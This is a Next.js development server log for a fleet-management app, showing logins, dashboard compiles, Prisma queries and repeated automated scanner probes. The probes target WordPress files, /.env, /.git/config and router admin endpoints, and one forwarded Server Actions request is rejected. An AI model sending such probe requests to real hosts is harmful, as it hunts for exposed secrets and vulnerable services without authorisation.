+ HEAD /home 404 in 11ms
+ GET / 200 in 332ms
+ GET / 200 in 58ms
+ GET /wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /xmlrpc.php?rsd 404 in 33ms
+ GET / 200 in 111ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 45ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET / 200 in 914ms
+ GET /favicon.ico 200 in 80ms
+ GET /.env 404 in 92ms
+ GET / 200 in 804ms
+ GET /register 200 in 384ms
+ POST /register 200 in 58ms
+ POST /register 200 in 57ms
+ GET /login 200 in 62ms
+ GET / 200 in 163ms
+ GET / 200 in 931ms
+ GET / 200 in 121ms
+ GET /wp-includes/wlwmanifest.xml 404 in 103ms
+ GET /xmlrpc.php?rsd 404 in 51ms
+ GET / 200 in 82ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 1312ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 112ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 122ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp-admin/setup-config.php 404 in 811ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 162ms
+ GET / 200 in 556ms
+ GET /wp-includes/ID3/license.txt 404 in 35ms
+ GET /xmlrpc.php?rsd 404 in 35ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 47ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 94ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /.env 404 in 735ms
+ GET / 200 in 586ms
+ GET / 200 in 370ms
+ HEAD / 200 in 146ms
+ HEAD / 200 in 762ms
+ GET / 200 in 129ms
+ GET / 200 in 252ms
+ GET /wp-includes/wlwmanifest.xml 404 in 43ms
+ GET /xmlrpc.php?rsd 404 in 36ms
+ GET / 200 in 91ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 31ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 89ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 41ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 118ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp-admin/setup-config.php 404 in 49ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 53ms
+ GET / 200 in 255ms
+ GET / 200 in 786ms
+ GET / 200 in 701ms
+ GET / 200 in 255ms
+ GET / 200 in 299ms
+ GET /wp-includes/ID3/license.txt 404 in 1589ms
+ GET /xmlrpc.php?rsd 404 in 45ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 42ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 101ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET / 200 in 88ms
+ GET / 200 in 909ms
+ GET / 200 in 90ms
+ GET /wp-includes/wlwmanifest.xml 404 in 74ms
+ GET /xmlrpc.php?rsd 404 in 70ms
+ GET / 200 in 131ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 110ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 120ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 119ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 31ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /robots.txt 404 in 65ms
+ GET / 200 in 256ms
+ GET / 200 in 166ms
+ GET /favicon.ico 200 in 72ms
+ GET /api/auth/session 200 in 197ms
+ GET /api/auth/session 200 in 56ms
+ GET /favicon.ico 200 in 23ms
+ GET /wp-admin/setup-config.php 404 in 68ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 48ms
+ GET / 200 in 715ms
+ GET / 200 in 157ms
+ GET /wp-includes/wlwmanifest.xml 404 in 46ms
+ GET /xmlrpc.php?rsd 404 in 121ms
+ GET / 200 in 53ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 1265ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 139ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 187ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET / 200 in 100ms
+ GET /favicon.ico 200 in 21ms
+ GET /c 404 in 45ms
+ GET / 200 in 900ms
+ GET / 200 in 149ms
+ GET /wp-includes/wlwmanifest.xml 404 in 50ms
+ GET /xmlrpc.php?rsd 404 in 71ms
+ GET / 200 in 69ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET / 200 in 155ms
+ HEAD / 200 in 408ms
+ GET / 200 in 82ms
+ GET /favicon.ico 200 in 53ms
+ GET / 200 in 541ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 556ms
+ GET /wp-admin/setup-config.php 404 in 54ms
+ GET / 200 in 979ms
+ GET / 200 in 197ms
+ GET / 200 in 136ms
+ GET / 200 in 440ms
+ GET / 200 in 781ms
+ GET / 200 in 125ms
+ GET /favicon.ico 200 in 64ms
+ GET / 200 in 2640ms
+ GET /cgi-bin/luci/;stok=/locale 404 in 67ms
+ GET / 200 in 2760ms
+ GET /favicon.ico 200 in 32ms
+ GET /robots.txt 404 in 175ms
+ GET /privacy 404 in 44ms
+ GET / 200 in 1051ms
+ GET /favicon.ico 200 in 68ms
+ GET /wp-admin/setup-config.php 404 in 673ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 89ms
+ GET / 200 in 293ms
+`x-forwarded-host` header with value `77.37.124.229:80` does not match `origin` header with value `77.37.124.229` from a forwarded Server Actions request. Aborting the action.
+ ⨯ Error: Invalid Server Actions request.
+    at rS (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:38:7099)
+    at r4 (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:41:1262)
+    at /root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:726
+    at AsyncLocalStorage.run (node:async_hooks:346:14)
+    at Object.wrap (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:36:16615)
+    at /root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:616
+    at AsyncLocalStorage.run (node:async_hooks:346:14)
+    at Object.wrap (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:36:15721)
+    at r6 (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:543)
+    at np.render (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:4661)
+    at doRender (/root/3gis-web/node_modules/next/dist/server/base-server.js:1418:44)
+    at cacheEntry.responseCache.get.routeKind (/root/3gis-web/node_modules/next/dist/server/base-server.js:1579:34)
+    at ResponseCache.get (/root/3gis-web/node_modules/next/dist/server/response-cache/index.js:49:26)
+    at DevServer.renderToResponseWithComponentsImpl (/root/3gis-web/node_modules/next/dist/server/base-server.js:1487:53)
+    at /root/3gis-web/node_modules/next/dist/server/base-server.js:998:121
+    at NextTracerImpl.trace (/root/3gis-web/node_modules/next/dist/server/lib/trace/tracer.js:105:20)
+    at DevServer.renderToResponseWithComponents (/root/3gis-web/node_modules/next/dist/server/base-server.js:998:41)
+    at DevServer.renderErrorToResponseImpl (/root/3gis-web/node_modules/next/dist/server/base-server.js:2169:35)
+    at async pipe.req.req (/root/3gis-web/node_modules/next/dist/server/base-server.js:2043:30)
+    at async DevServer.pipeImpl (/root/3gis-web/node_modules/next/dist/server/base-server.js:916:25)
+    at async /root/3gis-web/node_modules/next/dist/server/dev/next-dev-server.js:339:20
+    at async Span.traceAsyncFn (/root/3gis-web/node_modules/next/dist/trace/trace.js:154:20)
+    at async DevServer.handleRequest (/root/3gis-web/node_modules/next/dist/server/dev/next-dev-server.js:336:24)
+    at async invokeRender (/root/3gis-web/node_modules/next/dist/server/lib/router-server.js:173:21)
+    at async handleRequest (/root/3gis-web/node_modules/next/dist/server/lib/router-server.js:365:24)
+    at async requestHandlerImpl (/root/3gis-web/node_modules/next/dist/server/lib/router-server.js:374:13)
+    at async Server.requestListener (/root/3gis-web/node_modules/next/dist/server/lib/start-server.js:141:13)
+ ○ Compiling /_error ...
+ POST /boaform/admin/formLogin 500 in 9921ms
+ ✓ Compiled /_error in 4s (2971 modules)
+ GET / 200 in 2481ms
+ GET / 200 in 619ms
+ GET / 200 in 178ms
+ GET /wp-includes/wlwmanifest.xml 404 in 70ms
+ GET /xmlrpc.php?rsd 404 in 70ms
+ GET / 200 in 136ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 109ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 100ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET / 200 in 470ms
+ GET / 200 in 1115ms
+ GET / 200 in 82ms
+ GET /wp-includes/wlwmanifest.xml 404 in 52ms
+ GET /xmlrpc.php?rsd 404 in 52ms
+ GET / 200 in 91ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 142ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 109ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 32ms
+ GET /robots.txt 404 in 792ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 76ms
+ GET /wp-admin/setup-config.php 404 in 100ms
+ GET / 200 in 409ms
+ GET / 200 in 454ms
+ GET /wp-includes/ID3/license.txt 404 in 69ms
+ GET /xmlrpc.php?rsd 404 in 47ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 93ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 118ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 133ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET / 200 in 353ms
+ GET /wp-includes/ID3/license.txt 404 in 53ms
+ GET /xmlrpc.php?rsd 404 in 148ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 42ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /robots.txt 404 in 61ms
+ GET /privacy 404 in 39ms
+ ○ Compiling /login ...
+ ✓ Compiled /login in 3.5s (1422 modules)
+ GET /login 200 in 3864ms
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 879ms (1451 modules)
+ GET /favicon.ico 200 in 995ms
+ GET / 200 in 1825ms
+ GET / 200 in 779ms
+ ○ Compiling /api/auth/[...nextauth] ...
+ ✓ Compiled /api/auth/[...nextauth] in 4s (1732 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 5170ms
+ GET /api/auth/session 200 in 75ms
+ GET /api/auth/session 200 in 810ms
+ ○ Compiling /login ...
+ ✓ Compiled /login in 666ms (1736 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/providers 200 in 78ms
+ GET /api/auth/csrf 200 in 35ms
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE ("public"."User"."email" = $1 AND 1=1) LIMIT $2 OFFSET $3
+ POST /api/auth/callback/credentials 200 in 985ms
+ GET /api/auth/session 200 in 40ms
+ ○ Compiling /dashboard ...
+ ✓ Compiled /dashboard in 2.4s (1749 modules)
+ ✓ Compiled /dashboard/vehicles in 369ms (1749 modules)
+ ○ Compiling /dashboard/invoices ...
+ ✓ Compiled /dashboard/invoices in 642ms (1759 modules)
+ ✓ Compiled /dashboard/incidents in 260ms (1763 modules)
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 869ms (3315 modules)
+ GET /api/incidents 404 in 1066ms
+ GET /api/incidents 404 in 36ms
+ ○ Compiling /dashboard/analytics/co2 ...
+ ✓ Compiled /dashboard/analytics/co2 in 3s (2584 modules)
+ ○ Compiling /dashboard/vehicles/[id] ...
+ ✓ Compiled /dashboard/vehicles/[id] in 4.1s (2641 modules)
+ ○ Compiling /api/vehiclestest ...
+ ✓ Compiled /api/vehiclestest in 902ms (1109 modules)
+prisma:query SELECT 1
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 1210ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 74ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 122ms
+ ○ Compiling /dashboard/vehicles/[id]/[label] ...
+ ✓ Compiled /dashboard/vehicles/[id]/[label] in 915ms (2661 modules)
+prisma:query SELECT 1
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 163ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 68ms
+ ○ Compiling / ...
+ ✓ Compiled / in 1420ms (1494 modules)
+ GET / 200 in 1733ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 124ms
+ ○ Compiling /register ...
+ ✓ Compiled /api/auth/[...nextauth] in 1135ms (1510 modules)
+ ✓ Compiled (1819 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 1937ms
+ GET /register 200 in 2899ms
+ GET /api/auth/session 200 in 52ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 176ms
+ POST /api/auth/_log 200 in 27ms
+ GET /api/auth/session 200 in 45ms
+ GET /api/auth/session 200 in 28ms
+ ○ Compiling /login ...
+ ✓ Compiled /login in 770ms (1823 modules)
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 131ms
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/providers 200 in 90ms
+ GET /api/auth/csrf 200 in 27ms
+prisma:query SELECT 1
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE ("public"."User"."email" = $1 AND 1=1) LIMIT $2 OFFSET $3
+ POST /api/auth/callback/credentials 200 in 123ms
+ GET /api/auth/session 200 in 56ms
+ ○ Compiling /dashboard ...
+ ✓ Compiled /dashboard in 913ms (1839 modules)
+ ○ Compiling /dashboard/users ...
+ ✓ Compiled /dashboard/users in 3.4s (3397 modules)
+ ○ Compiling /api/user ...
+ ✓ Compiled /api/user in 1270ms (1831 modules)
+prisma:query SELECT 1
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE 1=1 OFFSET $1
+ GET /api/user 200 in 1407ms
+ ✓ Compiled /dashboard/analytics/fuel in 322ms (1842 modules)
+ ✓ Compiled /dashboard/invoices in 341ms (1848 modules)
+ GET / 200 in 2127ms
+ GET / 200 in 170ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 6.8s (3003 modules)
+ GET /wp-includes/wlwmanifest.xml 404 in 7293ms
+ GET /xmlrpc.php?rsd 404 in 30ms
+ GET / 200 in 160ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 38ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 32ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 37ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 37ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 41ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 43ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 40ms
+ GET /cgi-bin/luci/;stok=/locale 404 in 45ms
+ GET / 200 in 101ms
+ GET / 200 in 162ms
+ GET / 200 in 285ms
+ GET /wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /xmlrpc.php?rsd 404 in 34ms
+ GET / 200 in 134ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 42ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 39ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 32ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 31ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /cgi-bin/luci/;stok=/locale 404 in 53ms
+ GET / 200 in 107ms
+ ○ Compiling /register ...
+ ✓ Compiled /register in 1622ms (1056 modules)
+ GET /register 200 in 2013ms
+ ✓ Compiled /api/auth/[...nextauth] in 350ms (1371 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 676ms
+ GET /api/auth/session 200 in 25ms
+ ○ Compiling / ...
+ ✓ Compiled / in 928ms (1432 modules)
+ GET / 200 in 1347ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 5.2s (2606 modules)
+ GET /cgi-bin/luci/;stok=/locale 404 in 5841ms
+ ○ Compiling / ...
+ ✓ Compiled / in 1095ms (1432 modules)
+ GET / 200 in 1492ms
+ GET / 200 in 78ms
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 814ms (1462 modules)
+ GET /favicon.ico 200 in 1003ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 659ms (3033 modules)
+ GET /cgi-bin/luci/;stok=/locale 404 in 868ms
+ GET /wp-admin/setup-config.php 404 in 702ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 255ms
+ GET / 200 in 1038ms
+ GET /favicon.ico 200 in 133ms
+ GET / 200 in 2461ms
+ GET /robots.txt 404 in 658ms
+ GET /cgi-bin/luci/;stok=/locale 404 in 152ms
+ GET / 200 in 407ms
+ GET /favicon.ico 200 in 105ms
+ GET /.git/config 404 in 203ms
+ GET /cgi-bin/luci/;stok=/locale 404 in 722ms
+ GET / 200 in 858ms
+ GET / 200 in 269ms
+ GET /wp-includes/wlwmanifest.xml 404 in 57ms
+ GET /xmlrpc.php?rsd 404 in 227ms
+ GET / 200 in 210ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 67ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 45ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 37ms
